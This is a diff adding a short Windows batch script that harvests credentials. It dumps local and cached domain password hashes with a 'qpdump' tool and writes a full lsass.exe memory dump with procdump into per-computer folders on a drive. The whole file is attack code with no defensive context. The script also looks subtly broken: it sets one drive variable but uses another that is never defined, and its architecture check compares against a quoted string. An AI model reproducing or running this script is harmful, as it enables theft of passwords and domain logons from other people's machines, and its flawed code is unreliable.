@@ -1,0 +1,15 @@
+@echo off
+SET odrive=%odrive:~0,2% 
+%~d0
+cd %~dp0
+set PWDIR=%~dp0%COMPUTERNAME%
+mkdir %drive%\all\%COMPUTERNAME%
+resources/qpdump.exe -dhl > %drive%\all\%COMPUTERNAME%/local.txt
+resources/qpdump.exe -dhdc > %drive%\all\%COMPUTERNAME%/cached.txt
+if %PROCESSOR_ARCHITECTURE%=="AMD64" goto 64bit
+resources\procdump.exe -accepteula -ma lsass.exe %drive%\all\%COMPUTERNAME%/lsass.dmp
+goto done
+:64bit
+resources\procdump.exe -64 -accepteula -ma lsass.exe %drive%\all\%COMPUTERNAME%/lsass.dmp
+:done
+exit
